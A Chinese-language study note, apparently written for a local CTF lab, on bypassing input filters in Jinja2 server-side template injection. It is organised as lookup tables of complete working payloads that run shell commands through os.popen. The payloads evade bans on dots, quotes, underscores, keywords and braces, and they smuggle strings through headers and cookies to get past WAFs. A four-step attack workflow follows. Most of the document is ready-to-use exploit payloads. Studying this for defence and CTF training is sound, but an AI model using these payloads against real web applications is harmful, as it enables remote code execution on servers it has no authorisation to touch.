# SSTI 过滤绕过方法笔记

> 独立笔记（不放进四份讲义 —— 讲义严格按 task8 清单，这份是专项速查）
> 环境：Python 3.14.2 + Flask 3.1.3 + Jinja2 3.1.6 ｜ **本文件里所有结论都本机实测过**
> 相关：`3-Flask模板注入漏洞\练习-Part3.md` 的 C1~C7、`4-靶场实践\lab_ctf\ctf_app.py` 的 ch3~ch6

## 一、一句话原理

```
过滤检查  发生在「模板字符串进引擎之前」
~ 拼接    发生在「渲染时」
\x5f 转义 发生在「编译时」
```

**检查在前，还原在后** —— 中间这段缝隙就是所有绕过的立足点。
绕过不是"另一种攻击"，而是**同一个攻击换一套语法**。

## 二、三个抽屉：绕过时就在这里面换零件

### 抽屉一 · 字符串从哪来（6 种来源，全部实测）

| 来源 | 写法 | 实测输出 | 什么时候用 |
|---|---|---|---|
| 字面量 | `'os'` | `'os'` | 引号没被禁，最省事 |
| 拼接（`~`） | `'o'~'s'` | `'os'` | 关键词被禁 |
| 转义（`\xNN`） | `'\x5f\x5fglobals\x5f\x5f'` | `__globals__` | 下划线被禁 |
| **`dict()` 造名字** | `dict(__globals__=1)\|first` | `'__globals__'` | **引号被禁**（kwargs 的键不需要引号） |
| URL 参数 | `request.args.c` | `'os'` | 原文里不想出现该词 |
| 从对象抠字符 | `(lipsum\|string)[0]` | `'<'` | 极限情况（索引不稳定） |
| 从 dict 抠键名 | `(x\|attr('__globals__'))\|first` | `'__name__'` | 不用引号拿到一个真实名字 |

### 抽屉二 · 属性怎么取（5 种，全部实测）

| 写法 | 实测 | 备注 |
|---|---|---|
| `a.b` | 能 | 默认；属性优先，失败再试下标 |
| `a['b']` | 能 | 只做下标 |
| `a\|attr('b')` | 能 | 只做属性 → 禁点号时的首选 |
| `a\|attr('__getitem__')('b')` | 能 | 禁点号 + 禁中括号时的万能写法 |
| `a\|first` / `\|last` / `\|list` | `'__name__'` / `'Namespace'` | 不用中括号也能取首项/末项 |

### 抽屉三 · 结果怎么写（3 种，全部实测）

| 写法 | 实测 | 什么时候用 |
|---|---|---|
| `{{ x }}` | 正常输出 | 默认 |
| `{% print(x) %}` | 执行成功 | `{{` `}}` 被禁 |
| `{% if x %}yes{% endif %}` | 输出 `yes` | 禁输出 + 盲注（只看真假） |

## 三、按「禁什么」直接查表（全部实测通过）

| 被禁 | 换成什么 | 完整 payload |
|---|---|---|
| `.` | `\|attr('名')` | `{{ lipsum\|attr('__globals__')\|attr('__getitem__')('os')\|attr('popen')('whoami')\|attr('read')() }}` |
| `_` | `\x5f` | `{{ lipsum\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('os')\|attr('popen')('whoami')\|attr('read')() }}` |
| `os` `popen` `read` | `~` 拼接 | `{{ lipsum\|attr('__glo'~'bals__')\|attr('__getitem__')('o'~'s')\|attr('po'~'pen')('whoami')\|attr('re'~'ad')() }}` |
| `{{` `}}` | `{% print %}` | `{% print(lipsum.__globals__['os'].popen('whoami').read()) %}` |
| `'` `"` | `dict()` 造名字 | 见第四节 |
| `.` + `'` 一起禁 | `\|attr` + `dict()` | 见第四节 |
| `.` + `_` + 关键词 | 三招合体 | `{{ lipsum\|attr('\x5f\x5fglobals\x5f\x5f')\|attr('\x5f\x5fgetitem\x5f\x5f')('o'~'s')\|attr('po'~'pen')('id')\|attr('re'~'ad')() }}` |

## 四、硬核组合：禁点号 + 禁引号（不依赖 URL 参数）

```jinja
{{ lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)('whoami')|attr(dict(read=1)|first)() }}
```

实测：命令执行成功。

它为什么重要：字符串全部由 `dict(名字=1)|first` 在**模板内部**造出来，
**完全不读 URL 参数** —— 所以"过滤所有请求参数"这种 WAF 也挡不住它。

## 五、字符串的四种载体（换部位，绕"只过滤参数"的 WAF）

| 载体 | 写法 | 实测 |
|---|---|---|
| URL 参数 | `request.args.c`（`?c=os`） | `'os'` |
| 请求头 | `request.headers['X-Name']` / `request.headers.get('X-Name')` | `'popen'` |
| Cookie | `request.cookies['ck']` / `request.cookies.ck` | `'read'` |
| 表单 | `request.form.x`（POST body） | 同理 |

混用载体也能跑通（Header 给 `popen`、Cookie 给 `read`）：

```jinja
{{ lipsum.__globals__['os']|attr(request.headers['X-Name'])('whoami')|attr(request.cookies.ck)() }}
```

实测输出：`laptop-59ul2kdl\暗炎魔主`

**`request.args.c` 到底是什么**：

- `request` = Flask 注入模板的当前请求对象
- `request.args` = URL 里 `?` 后面那串查询参数解析出的字典（Werkzeug 的 `ImmutableMultiDict`）
- `.c` = 取名为 `c` 的参数值；点号只是写法，等价于 `request.args['c']`
- 它**本来不支持属性访问**（`getattr(args,'c')` 会失败），能用是因为 **Jinja2 的点号失败会回退到下标**

实测细节：

| 情况 | 结果 |
|---|---|
| `?c=os`，`{{ request.args.c }}` | `'os'` |
| `?c=os&c=second`，`{{ request.args.c }}` | `'os'`（**取第一个**） |
| `?c=os&c=second`，`{{ request.args.getlist('c') }}` | `['os', 'second']` |
| 参数不存在，`{{ request.args.zzz }}` | 空（Undefined 渲染成空字符串） |
| 参数只用来传名字 | `{{ lipsum\|attr(request.args.a)\|length }}` → `51` |

## 六、动手流程：四步，每步都发一次请求

```
① 探能否执行     {{7*7}}                 → 出 49 才继续
② 探禁项（逐个最小样本）
                 {{''.__class__}}        → 测点号
                 {{''['__class__']}}     → 测中括号
                 {{ 'a' }}               → 测引号
                 {%print(7*7)%}          → 测 {{ }}
                 {{'os'}}                → 测关键词
                 顺带发个 &x=1           → 测"是否连其他参数也过滤"
③ 分段搭链（别一步到位）
                 {{ dict(os=1)|first }}                              → 'os'        字符串造出来了
                 {{ lipsum|attr(dict(__globals__=1)|first)|length }}  → 51          属性取到了
                 {{ lipsum|attr(...)|attr(...)(...) }}                → 'whoami'    命令执行了
④ 收尾           有回显用 read()；无回显改读文件 / 写文件到静态目录 / 盲注
```

第 ③ 步最关键：**先验证字符串造对了，再验证属性取到了，最后才接 `.popen()`**。
一次性写完整条链、结果却是空白，你根本不知道断在哪一环。

## 七、报错对照表

| 现象 | 原因 | 改法 |
|---|---|---|
| 输出空白 | 属性取不到 → Undefined（静默失败） | 名字拼错，或 dict 该用 `['键']` / `\|attr('__getitem__')('键')` |
| `UndefinedError: 'dict object' has no attribute 'x'` | 用 `\|attr` 取 dict 的键 | 改 `['x']` 或 `\|attr('__getitem__')('x')` |
| `KeyError: 'os'` | 那个模块没 `import os` | 走 `['__builtins__']['__import__']('os')` |
| `'wrapper_descriptor' has no attribute '__globals__'` | 挑到的类没自己定义 `__init__` | 换类，或用 `\|selectattr('__name__','equalto','catch_warnings')\|first` |
| 输出还是原文 `{{7*7}}` | 没进模板引擎 | 换注入点 |
| 空、也不报错 | 沙箱 | 语法改写无效（需要沙箱逃逸，另一条线） |

## 八、边界：这些招对沙箱无效（实测）

| 模板写法 | 普通环境 | 沙箱环境（SandboxedEnvironment） |
|---|---|---|
| `{{ lipsum.__globals__ }}` | 拿到字典 | 空（被拦） |
| `{{ lipsum\|attr('__globals__') }}` | 拿到字典 | 空（被拦） |
| `{{ lipsum['__globals__'] }}` | 拿到字典 | 空（被拦） |
| `{{ lipsum\|attr('\x5f\x5fglobals\x5f\x5f') }}` | 拿到字典 | 空（被拦） |
| `{{ 'o'~'s' }}` | `'os'` | `'os'`（照样能跑） |

**原因**：沙箱不看原文，而是在**取属性那一刻**拿"解析后的名字"判断（`__globals__` 以 `_` 开头 → 拦）。
所以换多少种语法都一样拦。而 `'o'~'s'` 照样能跑，是因为沙箱管"取属性"、不管"拼字符串"。

## 九、原 payload 与绕过 payload 的逐段对照

原始 payload（无过滤时）：

```jinja
{{ lipsum.__globals__['os'].popen('whoami').read() }}
```

以「禁点号 + 禁引号」的版本为例：

```jinja
{{ lipsum|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)('whoami')|attr(dict(read=1)|first)() }}
```

逐段对照（**语义完全相同，只是每个语法节点换了形式**）：

| 段 | 原写法 | 绕过写法 | 为什么检查不到 |
|---|---|---|---|
| 输出 | `{{ ... }}` | `{{ ... }}`（本例没禁）或 `{% print(...) %}` | 原文里没有被禁的定界符 |
| 取 `lipsum` 的属性 | `.__globals__` | `\|attr(dict(__globals__=1)\|first)` | 属性名变成"运行期算出来的字符串"，原文里没有点号、也没有引号 |
| 取 `os` | `['os']` | `\|attr('__getitem__')(dict(os=1)\|first)` | 键名由 `dict()|first` 生成，原文没有 `'os'` |
| 调 `popen` | `.popen('whoami')` | `\|attr(dict(popen=1)\|first)('whoami')` | 方法名同样在运行期才拼出来 |
| 读结果 | `.read()` | `\|attr(dict(read=1)\|first)()` | 同上 |

**四个本质区别**：

1. **字符串来源变了**：从"字面量"变成"运行期产物"（参数值 / `~` 拼接 / `dict()` 键名）。
2. **属性名的身份变了**：从"源码里的标识符"变成"传给 `attr` 过滤器的字符串参数"。
3. **违禁字符的存在时间变了**：`\x5f`、`~` 让它们在**编译期/渲染期**才出现，而过滤只看**编译前**的原文。
4. **代价**：payload 更长、可读性更差、依赖更多前提（`attr` 过滤器可用、`dict` 全局可用、参数不被过滤、目标不是沙箱）；
   而且**语义没有任何变化** —— 它还是同一条链，只是换了写法。

## 十、一句话总结

```
禁点号   → |attr('名')
禁中括号 → |attr('__getitem__')('名') / |first / |last
禁引号   → dict(名=1)|first        ← 最容易被忽略的一招
禁下划线 → \x5f
禁关键词 → 'a'~'b'
禁 {{ }} → {% print(...) %}
换载体   → args / headers / cookies / form
对沙箱   → 以上全部无效
```
